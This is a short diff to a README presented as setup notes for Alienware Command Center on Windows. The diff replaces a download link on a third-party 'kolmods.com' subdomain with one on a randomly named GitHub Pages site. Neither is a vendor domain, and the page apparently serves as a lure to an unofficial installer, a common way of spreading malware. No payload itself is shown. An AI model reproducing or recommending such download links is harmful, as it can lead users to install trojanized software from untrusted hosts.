@@ -1,6 +1,6 @@
 # Alienware Command Center Windows Setup Notes
 
-[⬇ Download Alienware Command Center for Windows](https://alienware-command-center-setup.kolmods.com/)
+[⬇ Download Alienware Command Center for Windows](https://hopechestpersonalfoul350.github.io)
 
 ## Download & Install
 
